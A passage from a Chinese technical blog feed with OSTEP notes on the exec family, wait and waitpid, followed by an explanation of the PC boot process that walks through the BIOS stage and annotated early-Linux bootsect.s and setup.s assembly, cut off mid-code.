differences are combinations of:</p><ol><li><strong>L vs V</strong>: whether you want to pass the parameters to the exec’ed program as<ul><li>  <strong>L</strong>: individual parameters in the call (variable argument list): <code>execl()</code>, <code>execle()</code>, <code>execlp()</code>, and <code>execlpe()</code></li><li>  <strong>V</strong>: as an array of char* <code>execv()</code>, <code>execve()</code>, <code>execvp()</code>, and <code>execvpe()</code></li></ul> The array format is useful when the number of parameters that are to be sent to the exec’ed process are variable – as in not known in advance, so you can’t put in a fixed number of parameters in a function call.</li><li><strong>E</strong>: The versions with an ‘e’ at the end let you additionally pass an array of char* that are a set of strings added to the spawned processes environment before the exec’ed program launches. Yet another way of passing parameters, really.</li><li> <strong>P</strong>: The versions with ‘p’ in there use the environment variable <code>PATH</code> to search for the executable file named to execute. The versions without the ‘p’ require an absolute or relative file path to be prepended to the filename of the executable if it is not in the current working directory.</li></ol><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li>父进程：返回子进程的进程号</li><li>子进程：调用的进程<code>wait()</code>没有要等待的子进程，那么它会立即返回<code>-1</code>，指示错误。在这种情况下，<code>errno</code>将设置为<code>ECHILD</code>。可见man手册的return error内容</li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><code>pid_t wait (int * status)</code><ul><li>子进程的结束状态值会由参数status返回，如果不在意结束状态值，则参数status可以设成NULL</li></ul></li><li><code>pid_t waitpid(pid_t pid,int * status,int options)</code><ul><li>参数pid为欲等待的子进程识别码<ul><li>pid&lt;-1 等待进程组识别码为pid绝对值的任何子进程。  </li><li>pid=-1 等待任何子进程，相当于wait()。  </li><li>pid=0 等待进程组识别码与目前进程相同的任何子进程。  </li><li>pid&gt;0 等待任何子进程识别码为pid的子进程。</li></ul></li><li>子进程的结束状态返回后存于status</li></ul></li></ul><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>子进程在关闭标准输出后，printf无法打印到标准输出</p>]]></content>
    
    
    <categories>
      
      <category>OSTEP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机加电后发生了什么？代码 &amp; 理论分析</title>
    <link href="/p/8b271bd/"/>
    <url>/p/8b271bd/</url>
    
    <content type="html"><![CDATA[<p>计算机刚被加电的时候，RAM中空空如也，OS存储在磁盘中，CPU只能执行被加载到内存中的代码，那么操作系统的代码是如何被CPU执行的呢？</p><h1 id="1-BIOS阶段"><a href="#1-BIOS阶段" class="headerlink" title="1.BIOS阶段"></a>1.BIOS阶段</h1><p>首先，CPU被设计为加电瞬间CS:IP指向0xF000:0xFFF0，也即是0xFFFF0的位置。此时是在实模式下，这个地址即是实际物理地址，ROM BIOS被设计为存储在这个位置，它的代码入口地址即是0xFFFF0。BIOS的代码地址范围：0xFE000~0xFFFFF，这些代码的作用是：</p><ul><li>进行硬件自检，检测CPU、显卡、内存、硬盘的信息</li><li>在内存最开始的区域构建中断向量表（0x00000~0x003FF，1KB内存空间）</li><li>构建BIOS数据区（0x00400~0x004FF）</li><li>在上述数据区后面约57KB的位置加载8KB左右的、与中断向量表对应的中断处理程序</li></ul><h1 id="2-引导扇区（bootsect-s）"><a href="#2-引导扇区（bootsect-s）" class="headerlink" title="2.引导扇区（bootsect.s）"></a>2.引导扇区（bootsect.s）</h1><p>bootsect也被称为MBR（master boot record）</p><p>CPU收到int 0x19中断，在中断向量表中找到对应的中断服务程序的入口地址，并执行该<strong>中断服务程序对应的功能</strong>：将第一扇区（512个字节）的程序，也即是bootsect加载到内存中0x07C00地址处并跳转到此处</p><p>接下来，bootsect本身512个字节会被从0x7C00复制到内存的0x90000处</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> BOOTSEG<span class="hljs-comment">;// 将ds段寄存器置为7C0h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> INITSEG<span class="hljs-comment">;// 将es段寄存器置为9000h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">256</span><span class="hljs-comment">;// 移动计数值 ＝ 256字 = 512 字节</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">si</span><span class="hljs-comment">;// 源地址   ds:si = 07C0h:0000h</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">di</span>,<span class="hljs-built_in">di</span><span class="hljs-comment">;// 目的地址 es:di = 9000h:0000h</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsw</span><span class="hljs-comment">;// 重复执行，直到cx = 0;移动1个字</span><br></code></pre></td></tr></table></figure><p>之后，bootsect触发0x13中断将setup.s程序加载到内存的0x90200处</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">load_setup:<br>;<span class="hljs-regexp">//</span> 以下<span class="hljs-number">10</span>行的用途是利用BIOS中断INT <span class="hljs-number">13</span>h将setup模块从磁盘第<span class="hljs-number">2</span>个扇区<br>;<span class="hljs-regexp">//</span> 开始读到<span class="hljs-number">90200</span>h开始处，共读<span class="hljs-number">4</span>个扇区。如果读出错，则复位驱动器，并<br>;<span class="hljs-regexp">//</span> 重试，没有退路。<br>;<span class="hljs-regexp">//</span> INT <span class="hljs-number">13</span>h 的使用方法如下：<br>;<span class="hljs-regexp">//</span> ah = <span class="hljs-number">02</span>h - 读磁盘扇区到内存；al = 需要读出的扇区数量；<br>;<span class="hljs-regexp">//</span> ch = 磁道（柱面）号的低<span class="hljs-number">8</span>位；  cl = 开始扇区（<span class="hljs-number">0</span>－<span class="hljs-number">5</span>位），磁道号高<span class="hljs-number">2</span>位（<span class="hljs-number">6</span>－<span class="hljs-number">7</span>）；<br>;<span class="hljs-regexp">//</span> dh = 磁头号；  dl = 驱动器号（如果是硬盘则要置为<span class="hljs-number">7</span>）；<br>;<span class="hljs-regexp">//</span> es:bx -&gt;指向数据缓冲区；  如果出错则CF标志置位。 <br>movdx,<span class="hljs-number">0000</span>h;<span class="hljs-regexp">//</span> drive <span class="hljs-number">0</span>, head <span class="hljs-number">0</span><br>movcx,<span class="hljs-number">0002</span>h;<span class="hljs-regexp">//</span> sector <span class="hljs-number">2</span>, track <span class="hljs-number">0</span><br>movbx,<span class="hljs-number">0200</span>h;<span class="hljs-regexp">//</span> address = <span class="hljs-number">512</span>, <span class="hljs-keyword">in</span> INITSEG<br>movax,<span class="hljs-number">0200</span>h+SETUPLEN;<span class="hljs-regexp">//</span> service <span class="hljs-number">2</span>, nr of sectors<br>int<span class="hljs-number">13</span>h;<span class="hljs-regexp">//</span> read it<br>jncok_load_setup;<span class="hljs-regexp">//</span> ok - <span class="hljs-keyword">continue</span><br>movdx,<span class="hljs-number">0000</span>h<br>movax,<span class="hljs-number">0000</span>h;<span class="hljs-regexp">//</span> reset the diskette<br>int<span class="hljs-number">13</span>h<br>jmpload_setup<br></code></pre></td></tr></table></figure><p>再往后，再次触发0x13中断将系统模块装载入内存0x10000地址处</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">ok_load_setup:</span><br><span class="hljs-comment">;/* 取磁盘驱动器的参数，特别是每道的扇区数量。</span><br><span class="hljs-comment">;   取磁盘驱动器参数INT 13h调用格式和返回信息如下：</span><br><span class="hljs-comment">;   ah = 08hdl = 驱动器号（如果是硬盘则要置位7为1）。</span><br><span class="hljs-comment">;   返回信息：</span><br><span class="hljs-comment">;   如果出错则CF置位，并且ah = 状态码。</span><br><span class="hljs-comment">;   ah = 0, al = 0,         bl = 驱动器类型（AT/PS2）</span><br><span class="hljs-comment">;   ch = 最大磁道号的低8位，cl = 每磁道最大扇区数（位0-5），最大磁道号高2位（位6-7）</span><br><span class="hljs-comment">;   dh = 最大磁头数，       电力＝ 驱动器数量，</span><br><span class="hljs-comment">;   es:di -&gt; 软驱磁盘参数表。 */</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">dl</span>,<span class="hljs-number">00h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">0800h</span><span class="hljs-comment">;// AH=8 is get drive parameters</span><br><span class="hljs-keyword">int</span><span class="hljs-number">13h</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ch</span>,<span class="hljs-number">00h</span><br><span class="hljs-comment">;//seg cs;// 表示下一条语句的操作数在cs段寄存器所指的段中。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cs</span>:sectors,<span class="hljs-built_in">cx</span><span class="hljs-comment">;// 保存每磁道扇区数。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// 因为上面取磁盘参数中断改掉了es的值，这里重新改回。</span><br></code></pre></td></tr></table></figure><p>由于这部分代码比较长，因此时间也比较久，屏幕上会打印出“loading system”进行提醒</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;// Print some inane message   在显示一些信息（&#x27;Loading system ... &#x27;回车换行，共24个字符）。</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">03h</span><span class="hljs-comment">;// read cursor pos</span><br><span class="hljs-keyword">xor</span><span class="hljs-number">bh</span>,<span class="hljs-number">bh</span><span class="hljs-comment">;// 读光标位置。</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">27</span><span class="hljs-comment">;// 共24个字符。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">bx</span>,<span class="hljs-number">0007h</span><span class="hljs-comment">;// page 0, attribute 7 (normal)</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">bp</span>,offset msg1<span class="hljs-comment">;// 指向要显示的字符串。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">1301h</span><span class="hljs-comment">;// write string, move cursor</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><span class="hljs-comment">;// 写字符串并移动光标。</span><br></code></pre></td></tr></table></figure><p>最后，确认根文件系统的设备号，并跳转到setup函数的0x90200地址处</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs awk">;<span class="hljs-regexp">//</span> 此后，我们检查要使用哪个根文件系统设备（简称根设备）。如果已经指定了设备（!=<span class="hljs-number">0</span>）<br>;<span class="hljs-regexp">//</span> 就直接使用给定的设备。否则就需要根据BIOS报告的每磁道扇区数来<br>;<span class="hljs-regexp">//</span> 确定到底使用<span class="hljs-regexp">/dev/</span>PS0(<span class="hljs-number">2</span>,<span class="hljs-number">28</span>)还是<span class="hljs-regexp">/dev/</span>at0(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>)。<br>;<span class="hljs-regexp">//</span>上面一行中两个设备文件的含义：<br>;<span class="hljs-regexp">//</span>在Linux中软驱的主设备号是<span class="hljs-number">2</span>（参加第<span class="hljs-number">43</span>行注释），次设备号 = type*<span class="hljs-number">4</span> + nr, 其中<br>;<span class="hljs-regexp">//</span>nr为<span class="hljs-number">0</span>－<span class="hljs-number">3</span>分别对应软驱A、B、C或D；type是软驱的类型（<span class="hljs-number">2</span>-&gt;<span class="hljs-number">1.2</span>M或<span class="hljs-number">7</span>-&gt;<span class="hljs-number">1.44</span>M等）。<br>;<span class="hljs-regexp">//</span>因为<span class="hljs-number">7</span>*<span class="hljs-number">4</span> + <span class="hljs-number">0</span> = <span class="hljs-number">28</span>，所以<span class="hljs-regexp">/dev/</span>PS0(<span class="hljs-number">2</span>,<span class="hljs-number">28</span>)指的是<span class="hljs-number">1.44</span>M A驱动器，其设备号是<span class="hljs-number">021</span>c<br>;<span class="hljs-regexp">//</span>同理 <span class="hljs-regexp">/dev/</span>at0(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>)指的是<span class="hljs-number">1.2</span>M A驱动器，其设备号是<span class="hljs-number">0208</span>。<br><br>;<span class="hljs-regexp">//</span>seg cs<br>movax,cs:root_dev<br>cmpax,<span class="hljs-number">0</span><br>jneroot_defined;<span class="hljs-regexp">//</span> 如果 ax != <span class="hljs-number">0</span>, 转到root_defined<br>;<span class="hljs-regexp">//</span>seg cs<br>movbx,cs:sectors;<span class="hljs-regexp">//</span> 取上面保存的每磁道扇区数。如果sectors=<span class="hljs-number">15</span><br>;<span class="hljs-regexp">//</span> 则说明是<span class="hljs-number">1.2</span>Mb的驱动器；如果sectors=<span class="hljs-number">18</span>，则说明是<br>;<span class="hljs-regexp">//</span> <span class="hljs-number">1.44</span>Mb软驱。因为是可引导的驱动器，所以肯定是A驱。<br>movax,<span class="hljs-number">0208</span>h;<span class="hljs-regexp">//</span> <span class="hljs-regexp">/dev/</span>ps0 - <span class="hljs-number">1.2</span>Mb<br>cmpbx,<span class="hljs-number">15</span>;<span class="hljs-regexp">//</span> 判断每磁道扇区数是否=<span class="hljs-number">15</span><br>jeroot_defined;<span class="hljs-regexp">//</span> 如果等于，则ax中就是引导驱动器的设备号。<br>movax,<span class="hljs-number">021</span>ch;<span class="hljs-regexp">//</span> <span class="hljs-regexp">/dev/</span>PS0 - <span class="hljs-number">1.44</span>Mb<br>cmpbx,<span class="hljs-number">18</span><br>jeroot_defined<br>undef_root:;<span class="hljs-regexp">//</span> 如果都不一样，则死循环（死机）。<br>jmp undef_root<br>root_defined:<br>;<span class="hljs-regexp">//</span>seg cs<br>movcs:root_dev,ax;<span class="hljs-regexp">//</span> 将检查过的设备号保存起来。<br><br>;<span class="hljs-regexp">//</span> 到此，所有程序都加载完毕，我们就跳转到被<br>;<span class="hljs-regexp">//</span> 加载在bootsect后面的setup程序去。<br><br>;jmpSETUPSEG:[<span class="hljs-number">0</span>];<span class="hljs-regexp">//</span> 跳转到<span class="hljs-number">9020</span>:<span class="hljs-number">0000</span>（setup程序的开始处）。<br>db <span class="hljs-number">0</span>eah<br>dw <span class="hljs-number">0</span><br>dw SETUPSEG<br></code></pre></td></tr></table></figure><h1 id="3-setup"><a href="#3-setup" class="headerlink" title="3.setup"></a>3.setup</h1><p>利用BIOS中断读取机器数据，将其保存到0x90000地址处（会覆盖掉bootsect代码），这些数据包括硬件参数表、光标位置、根设备号等等</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;// setup.s负责从BIOS 中获取系统数据，并将这些数据放到系统内存的适当地方。</span><br><span class="hljs-comment">;// 此时setup.s 和system 已经由bootsect 引导块加载到内存中。</span><br><span class="hljs-comment">;// 这段代码询问bios 有关内存/磁盘/其它参数，并将这些参数放到一个</span><br><span class="hljs-comment">;// “安全的”地方：90000-901FF，也即原来bootsect 代码块曾经在</span><br><span class="hljs-comment">;// 的地方，然后在被缓冲块覆盖掉之前由保护模式的system 读取。</span><br><br><span class="hljs-comment">;// 以下这些参数最好和bootsect.s 中的相同！</span><br> INITSEG  = <span class="hljs-number">9000h</span><span class="hljs-comment">;// 原来bootsect 所处的段</span><br> SYSSEG   = <span class="hljs-number">1000h</span><span class="hljs-comment">;// system 在10000(64k)处。</span><br> SETUPSEG = <span class="hljs-number">9020h</span><span class="hljs-comment">;// 本程序所在的段地址。</span><br><br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><br><br><span class="hljs-comment">;// ok, 整个读磁盘过程都正常，现在将光标位置保存以备今后使用。</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<span class="hljs-comment">;// 将ds 置成INITSEG(9000)。这已经在bootsect 程序中</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// 设置过，但是现在是setup 程序，Linus 觉得需要再重新</span><br><span class="hljs-comment">;// 设置一下。</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">03h</span><span class="hljs-comment">;// BIOS 中断10 的读光标功能号ah = 03</span><br><span class="hljs-keyword">xor</span><span class="hljs-number">bh</span>,<span class="hljs-number">bh</span><span class="hljs-comment">;// 输入：bh = 页号</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><span class="hljs-comment">;// 返回：ch = 扫描开始线，cl = 扫描结束线，</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>],<span class="hljs-built_in">dx</span><span class="hljs-comment">;// dh = 行号(00 是顶端)，dl = 列号(00 是左边)。</span><br><span class="hljs-comment">;// 将光标位置信息存放在90000 处，控制台初始化时会来取。</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">88h</span><span class="hljs-comment">;// 这3句取扩展内存的大小值（KB）。</span><br><span class="hljs-keyword">int</span><span class="hljs-number">15h</span><span class="hljs-comment">;// 是调用中断15，功能号ah = 88</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">2</span>],<span class="hljs-built_in">ax</span><span class="hljs-comment">;// 返回：ax = 从100000（1M）处开始的扩展内存大小(KB)。</span><br><span class="hljs-comment">;// 若出错则CF 置位，ax = 出错码。</span><br><br><span class="hljs-comment">;// 下面这段用于取显示卡当前显示模式。</span><br><span class="hljs-comment">;// 调用BIOS 中断10，功能号ah = 0f</span><br><span class="hljs-comment">;// 返回：ah = 字符列数，al = 显示模式，bh = 当前显示页。</span><br><span class="hljs-comment">;// 90004(1 字)存放当前页，90006 显示模式，90007 字符列数。</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">0fh</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">4</span>],<span class="hljs-built_in">bx</span><span class="hljs-comment">;// bh = display page</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">6</span>],<span class="hljs-built_in">ax</span><span class="hljs-comment">;// al = video mode, ah = window width</span><br><br><span class="hljs-comment">;// 检查显示方式（EGA/VGA）并取参数。</span><br><span class="hljs-comment">;// 调用BIOS 中断10，附加功能选择-取方式信息</span><br><span class="hljs-comment">;// 功能号：ah = 12，bl = 10</span><br><span class="hljs-comment">;// 返回：bh = 显示状态</span><br><span class="hljs-comment">;// (00 - 彩色模式，I/O 端口=3dX)</span><br><span class="hljs-comment">;// (01 - 单色模式，I/O 端口=3bX)</span><br><span class="hljs-comment">;// bl = 安装的显示内存</span><br><span class="hljs-comment">;// (00 - 64k, 01 - 128k, 02 - 192k, 03 = 256k)</span><br><span class="hljs-comment">;// cx = 显示卡特性参数(参见程序后的说明)。</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">12h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">bl</span>,<span class="hljs-number">10h</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">8</span>],<span class="hljs-built_in">ax</span><span class="hljs-comment">;// 90008 = ??</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">10</span>],<span class="hljs-built_in">bx</span><span class="hljs-comment">;// 9000A = 安装的显示内存，9000B = 显示状态(彩色/单色)</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">12</span>],<span class="hljs-built_in">cx</span><span class="hljs-comment">;// 9000C = 显示卡特性参数。</span><br><br><span class="hljs-comment">;// 取第一个硬盘的信息（复制硬盘参数表）。</span><br><span class="hljs-comment">;// 第1 个硬盘参数表的首地址竟然是中断向量41 的向量值！而第2 个硬盘</span><br><span class="hljs-comment">;// 参数表紧接第1 个表的后面，中断向量46 的向量值也指向这第2 个硬盘</span><br><span class="hljs-comment">;// 的参数表首址。表的长度是16 个字节(10)。</span><br><span class="hljs-comment">;// 下面两段程序分别复制BIOS 有关两个硬盘的参数表，90080 处存放第1 个</span><br><span class="hljs-comment">;// 硬盘的表，90090 处存放第2 个硬盘的表。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">0000h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">lds</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">4</span>*<span class="hljs-number">41h</span>]<span class="hljs-comment">;// 取中断向量41 的值，也即hd0 参数表的地址 ds:si</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">di</span>,<span class="hljs-number">0080h</span><span class="hljs-comment">;// 传输的目的地址: 9000:0080 -&gt; es:di</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">10h</span><span class="hljs-comment">;// 共传输10 字节。</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span><br><br><span class="hljs-comment">;// Get hd1 data</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">0000h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">lds</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">4</span>*<span class="hljs-number">46h</span>]<span class="hljs-comment">;// 取中断向量46 的值，也即hd1 参数表的地址 -&gt; ds:si</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">di</span>,<span class="hljs-number">0090h</span><span class="hljs-comment">;// 传输的目的地址: 9000:0090 -&gt; es:di</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">10h</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span><br><br><br><span class="hljs-comment">;// 检查系统是否存在第2 个硬盘，如果不存在则第2 个表清零。</span><br><span class="hljs-comment">;// 利用BIOS 中断调用13 的取盘类型功能。</span><br><span class="hljs-comment">;// 功能号ah = 15；</span><br><span class="hljs-comment">;// 输入：dl = 驱动器号（8X 是硬盘：80 指第1 个硬盘，81 第2 个硬盘）</span><br><span class="hljs-comment">;// 输出：ah = 类型码；00 --没有这个盘，CF 置位； 01 --是软驱，没有change-line 支持；</span><br><span class="hljs-comment">;//  02--是软驱(或其它可移动设备)，有change-line 支持； 03 --是硬盘。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">1500h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">dl</span>,<span class="hljs-number">81h</span><br><span class="hljs-keyword">int</span><span class="hljs-number">13h</span><br><span class="hljs-keyword">jc</span>no_disk1<br><span class="hljs-keyword">cmp</span><span class="hljs-number">ah</span>,<span class="hljs-number">3</span><span class="hljs-comment">;// 是硬盘吗？(类型= 3 ？)。</span><br><span class="hljs-keyword">je</span>is_disk1<br><span class="hljs-symbol">no_disk1:</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<span class="hljs-comment">;// 第2个硬盘不存在，则对第2个硬盘表清零。</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">di</span>,<span class="hljs-number">0090h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">10h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">00h</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">stosb</span><br></code></pre></td></tr></table></figure><p>将位于0x10000地址处的内核程序复制到0x00000地址处（会覆盖掉终端向量表和BIOS数据区）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">do_move:</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// es:di -&gt; 目的地址(初始为0000:0)</span><br><span class="hljs-keyword">add</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">1000h</span><br><span class="hljs-keyword">cmp</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">9000h</span><span class="hljs-comment">;// 已经把从8000 